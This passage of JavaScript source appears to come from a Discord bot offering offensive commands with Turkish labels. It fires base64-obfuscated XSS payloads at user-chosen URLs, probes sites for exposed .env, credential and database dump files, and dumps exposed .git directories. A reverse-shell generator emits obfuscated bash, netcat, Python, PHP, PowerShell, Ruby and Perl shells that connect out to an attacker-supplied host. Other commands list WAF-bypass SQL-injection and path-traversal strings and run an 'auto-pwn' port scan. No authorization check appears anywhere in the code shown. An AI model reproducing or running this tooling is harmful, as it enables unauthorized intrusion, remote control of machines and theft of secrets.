            { n: 'Details Toggle', p: _atob('PGRldGFpbHMgb3BlbiBvbnRvZ2dsZT1hbGVydCgxKT4=') },
            { n: 'Marquee', p: _atob('PG1hcnF1ZWUgb25zdGFydD1hbGVydCgxKT4=') },
            { n: 'Polyglot', p: _atob('Iic+PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+') },
            { n: 'JS URI', p: _atob('amF2YXNjcmlwdDphbGVydCgxKQ==') },
            { n: 'Style XSS', p: _atob('PC9zdHlsZT48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+') },
          ];

          let result = `**XSS Taramasi:** \`${url}\`\nParam: \`${param}\`\n\n`;
          const findings = [];

          for (const pl of payloads) {
            try {
              const testUrl = basePart + '?' + new URLSearchParams({ ...Object.fromEntries(params), [param]: val + pl.p }).toString();
              const r = await safeFetch(testUrl, {
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
                redirect: 'manual'
              }, 5000);
              const body = await r.text().catch(() => '');
              if (body.includes(pl.p)) findings.push({ n: pl.n, r: '[KAPALI] REFLECTED!' });
              else if (body.toLowerCase().includes('alert(')) findings.push({ n: pl.n, r: '[BEKLIYOR] Islenmis (DOM?)' });
            } catch (e) { /* timeout */ }
          }

          result += findings.length > 0 ? `[ALARM] **${findings.length} BULGU!**\n\n${findings.map(f => `**${f.n}:** ${f.r}`).join('\n')}` : '[OK] Goze carpan XSS yok.';
          result += '\n[IPUCU] *WAF varsa /waf-atlat dene.*';
          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `XSS Tarama Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'config-avla':
      ctx.waitUntil((async () => {
        try {
          let domain = getOption('domain').replace(/^https?:\/\//, '').replace(/\/.*/, '').trim();
          const base = `https://${domain}`;
          const paths = [
            '.env', '.env.backup', '.env.bak', '.env.dev', '.env.local',
            '.git/config', '.git/HEAD',
            'wp-config.php', 'wp-config.bak', 'backup.sql', 'dump.sql', 'database.sql',
            'docker-compose.yml', 'Dockerfile', 'config.json', 'config.yml', 'config.php',
            'credentials.json', 'admin.php', 'adminer.php', 'phpinfo.php',
            'phpMyAdmin/', '.DS_Store', 'robots.txt', 'sitemap.xml',
            '.htaccess', 'composer.json', 'package.json'
          ];

          let result = `**Config/Dump Taramasi:** \`${domain}\`\n\n`;
          const found = [];
          const sensitive = [];

          await Promise.allSettled(paths.map(async p => {
            try {
              const r = await safeFetch(`${base}/${p}`, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' }, 5000);
              const cl = r.headers.get('content-length');
              const size = cl ? parseInt(cl) : 0;
              if (r.status === 200 && size > 10) {
                const body = await r.text().catch(() => '');
                found.push({ path: p, size });
                const marks = ['DB_PASSWORD', 'SECRET_KEY', 'API_KEY', 'token', 'password=', 'DATABASE_URL', 'redis://', 'mongodb://', 'JWT_SECRET', 'AKIA'];
                if (marks.some(m => body.includes(m))) sensitive.push(p);
              } else if (r.status === 403) found.push({ path: p, size: 0 });
            } catch (e) { /* dosya yok */ }
          }));

          if (found.length > 0) {
            result += `[ALARM] **${found.length} acik!**\n\n`;
            found.forEach(f => result += `[DOSYA] \`${f.path}\` (${f.size}b)${sensitive.includes(f.path) ? ' [KAPALI] HASSAS!' : ''}\n`);
            if (sensitive.length > 0) result += `\n[UYARI] ${sensitive.length} dosyada sifre/key/token!`;
          } else result += '[OK] Acik config bulunamadi.';
          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Config Tarama Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'reverse-shell':
      ctx.waitUntil((async () => {
        try {
          const ip = getOption('ip');
          const port = getOption('port') || 4444;
          let result = `**Reverse Shell Generator**\nLHOST: \`${ip}\` | LPORT: \`${port}\`\n\n`;

          const shells = [
            ['Bash', 'YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDA+JjE='],
            ['Netcat (-e)', 'bmMgLWUgL2Jpbi9zaCBJUCBQT1JU'],
            ['Netcat (-c)', 'bmMgLWMgc2ggSVAgUE9SVA=='],
            ['Python3', 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIklQIixQT1JUKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pJw=='],
            ['PHP exec', 'cGhwIC1yICckcz1mc29ja29wZW4oIklQIixQT1JUKTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc='],
            ['PowerShell', 'cG93ZXJzaGVsbCAtbm9wIC1jICIkYz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJ0lQJyxQT1JUKTskcz0kYy5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRiPTAuLjY1NTM1fCV7MH07d2hpbGUoKCRpPSRzLlJlYWQoJGIsMCwkYi5MZW5ndGgpKSAtbmUgMCl7OyRkPShOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGIsMCwkaSk7JHM9KGlleCAkZCAyPiYxIHwgT3V0LVN0cmluZyk7JHNkPSRzICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2I9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZCk7JHMuV3JpdGUoJHNiLDAsJHNiLkxlbmd0aCk7JHMuRmx1c2goKX07JGMuQ2xvc2UoKSI='],
            ['Ruby', 'cnVieSAtcnNvY2tldCAtZSAnZj1UQ1BTb2NrZXQub3BlbigiSVAiLFBPUlQpLnRvX2k7ZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIDwmJWQgPiYlZCAyPiYlZCIsZixmLGYpJw=='],
            ['Perl', 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iSVAiOyRwPVBPUlQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jw=='],
          ];

          for (const [name, b64] of shells) {
            const cmd = _atob(b64).replace(/IP/g, ip).replace(/PORT/g, String(port));
            result += `**${name}:**\n\`\`\`\n${cmd}\n\`\`\`\n`;
          }
          result += '[IPUCU] Dinleyici: `nc -lvnp PORT`';
          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Reverse Shell Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'waf-atlat':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const base = url.startsWith('http') ? url : 'https://' + url;
          let result = `**WAF Tespit & Bypass:** \`${url}\`\n\n`;

          const r = await safeFetch(base, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
            redirect: 'follow'
          }, 8000);

          const h = {}; r.headers.forEach((v, k) => h[k.toLowerCase()] = v);
          let waf = 'Tespit edilemedi';
          if (h['cf-ray'] || h.server === 'cloudflare') waf = 'Cloudflare';
          else if (h['x-sucuri-id']) waf = 'Sucuri';
          else if (h.server?.includes('Mod')) waf = 'ModSecurity';
          else if (h['akamai-origin-hop']) waf = 'Akamai';

          result += `[KORUMA] **WAF:** ${waf}\n\n[ACIK] **Bypass Onerileri:**\n`;
          const bypass = waf === 'Cloudflare'
            ? ['URL Encode: %27%20OR%201=1--', 'Case Toggle: SeLeCt * FrOm users', 'Unicode: %u0027 OR 1=1--', 'Path Traversal: /%2e%2e/etc/passwd', 'Null byte: %00<script>alert(1)</script>']
            : ['Double URL: %2527%20OR%201=1--', 'Hex Encode: 0x2720OR201=1--', 'Comment Injection: /**/OR/**/1=1#', 'Null Byte: %00<script>alert(1)</script>', 'UTF-8 Oversize: %c0%a7', 'HTTP/0.9 Downgrade', 'Multipart Bypass: boundary manip'];
          bypass.forEach(p => result += `\`${p}\`\n`);
          result += '\n[IPUCU] *Bu payloadlari /sql-tara veya /xss-tara ile test et.*';
          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `WAF Analiz Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'auto-pwn':
      ctx.waitUntil((async () => {
        try {
          let target = getOption('domain').replace(/^https?:\/\//, '').replace(/\/.*/, '').trim();
          let result = `**Auto-Pwn Zinciri:** \`${target}\`\n\n`;

          result += '[AYAR] **1. Port Tarama...**\n';
          const ports = [[21,'FTP'],[22,'SSH'],[25,'SMTP'],[53,'DNS'],[80,'HTTP'],[110,'POP3'],[143,'IMAP'],[443,'HTTPS'],[3306,'MySQL'],[3389,'RDP'],[5432,'PG'],[6379,'Redis'],[27017,'Mongo'],[8080,'HTTP-Alt'],[8443,'HTTPS-Alt']];
          const open = [];
          await Promise.allSettled(ports.map(async ([p,svc]) => {
            try {
              const ac = new AbortController(); setTimeout(() => ac.abort(), 1500);
              await fetch(`http://${target}:${p}`, { signal: ac.signal, method: 'HEAD' });
              open.push({ p, svc });
            } catch (e) {}
          }));
          result += open.length > 0 ? `   Acik: ${open.map(o => `${o.p}(${o.svc})`).join(', ')}\n\n` : '   Acik port yok.\n\n';

          result += '[AI] **2. Teknoloji Kesfi...**\n';
          try {
            const tr = await safeFetch(`https://${target}`, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
            const b = await tr.text().catch(() => '');
            const techs = [];
            ['wp-content','jquery','bootstrap','react','vue','angular','laravel','django','nginx','apache','cloudflare'].forEach(t => {
              if (b.includes(t)) techs.push(t.charAt(0).toUpperCase()+t.slice(1));
            });
            result += `   Tespit: ${techs.length > 0 ? techs.join(', ') : 'Temel'}\n\n`;
          } catch (e) { result += '   Bilinmiyor.\n\n'; }

          result += '[LISTE] **3. Onerilen Saldiri Zinciri:**\n';
          result += '   1. nmap -sV -sC -p- TARGET\n';
          result += '   2. /hedef-kesif + /alt-alan + /config-avla\n';
          if (open.some(o => o.p === 80 || o.p === 443)) result += '   3. /sql-tara + /xss-tara + /waf-atlat\n';
          if (open.some(o => o.p === 3306 || o.p === 5432 || o.p === 6379)) result += '   4. DB portu acik! Exploit arastir.\n';
          result += '   5. /tehdit-model + /exploit-ara\n';
          if (open.length > 0) result += `\n[UYARI] **${open.length} acik port!** Atak yuzeyi genis.`;

          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Auto-Pwn Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'git-dump':
      ctx.waitUntil((async () => {
        try {
          let url = getOption('url');
          if (!url.startsWith('http')) url = 'https://' + url;
          url = url.replace(/\/$/, '');
          let result = `**Git Dump Taramasi:** \`${url}\`\n\n`;

          const files = ['.git/HEAD', '.git/config', '.git/index', '.git/description', '.git/logs/HEAD', '.git/refs/heads/master', '.git/refs/heads/main', '.gitignore'];
          const found = [];

          await Promise.allSettled(files.map(async f => {
            try {
              const r = await safeFetch(`${url}/${f}`, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' }, 5000);
              if (r.status === 200) {
                const body = await r.text().catch(() => '');
                found.push({ file: f, preview: body.slice(0, 120) });
              }
            } catch (e) {}
          }));

          if (found.length > 0) {
            result += `[ALARM] **.git ACIK! (${found.length} dosya)**\n\n`;
            found.forEach(f => result += `[DOSYA] \`${f.file}\`: ${f.preview.trim().slice(0, 80)}\n`);
            result += `\n[ARAC] \`git-dumper ${url}/.git output/\`\n[UYARI] Tum kaynak kodu ifsa olabilir!`;
          } else result += '[OK] .git kapali.\n[IPUCU] /config-avla ile diger dosyalari kontrol et.';
          await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: `Git Dump Hatasi: ${err.message}` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    default:
      return null;
  }
}
